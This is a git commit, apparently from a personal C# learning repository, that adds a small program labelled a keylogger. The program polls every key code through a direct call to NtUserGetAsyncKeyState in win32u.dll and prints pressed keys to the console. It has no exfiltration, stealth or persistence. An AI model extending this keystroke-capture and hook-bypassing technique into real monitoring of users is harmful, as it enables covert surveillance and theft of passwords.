d61e4c771d2a91d011c6ab5da5110764da1ef562
Ahmed Magdy <ahmedmagdy92@yahoo.com>
2025-09-07 08:50:27 +0300

    keylogger using direct kernel call

---
+++ Learning_CSharp/11_lesson/Program.cs
@@ -0,0 +1,28 @@
+﻿using System.Reflection.Metadata.Ecma335;
+using System.Runtime.InteropServices;
+
+namespace Program;
+
+public class Program
+{
+    [DllImport("win32u.dll", EntryPoint = "NtUserGetAsyncKeyState", SetLastError = true)]
+    private static extern short NtUserGetAsyncKeyState(int vKey);
+
+    [STAThread]
+    public static int Main(string[] args)
+    {
+        while (true)
+        {
+            for (int i = 0; i < 255; i++)
+            {
+                short keyState = NtUserGetAsyncKeyState(i);
+                if ((keyState & 0x8000) != 0) // Check if the high-order bit is set
+                {
+                    Console.WriteLine($"Key {(char)i} is currently pressed.");
+                }
+            }
+            System.Threading.Thread.Sleep(100); // Sleep to reduce CPU usage
+        }
+    }
+}
+
